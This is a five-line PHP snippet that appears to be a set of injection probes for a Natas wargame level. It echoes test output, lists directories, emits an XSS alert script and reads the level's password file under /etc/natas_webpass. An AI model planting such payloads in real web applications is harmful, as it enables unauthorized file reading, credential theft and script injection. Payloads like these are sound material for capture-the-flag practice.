<?php echo '<p>Hello World</p>'; ?> 
<?php echo 'scandir("/var/");'; ?> 
<p><?php scandir('/home/'); ?> </p>
<?php echo '<script>alert("XSS");</script>'; ?> 
<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>
